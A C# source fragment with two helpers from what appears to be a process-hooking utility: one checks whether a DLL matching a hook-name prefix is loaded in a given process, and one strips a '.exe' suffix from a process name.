    /// <returns><c>true</c> and the matching module when found; otherwise <c>false</c>.</returns>
    private static bool TryGetHookModule(Process process, [NotNullWhen(true)] out ProcessModule? hookModule)
    {
        hookModule = null;

        try
        {
            foreach (ProcessModule module in process.Modules)
            {
                var name = module.ModuleName;
                if (!string.IsNullOrEmpty(name)
                    && name.StartsWith(HookModulePrefix, StringComparison.OrdinalIgnoreCase)
                    && name.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                {
                    // Found a loaded module that matches the expected hook naming pattern; assume it's ours.
                    hookModule = module;
                    return true;
                }
            }
        }
        catch
        {
        }

        return false;
    }

    /// <summary>
    /// Strips a trailing <c>.exe</c> suffix so the value is compatible with <see cref="Process.GetProcessesByName(string)"/>.
    /// </summary>
    private static string NormalizeProcessName(string name)
    {
        return name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
            ? name.Substring(0, name.Length - 4)
            : name;
    }
}
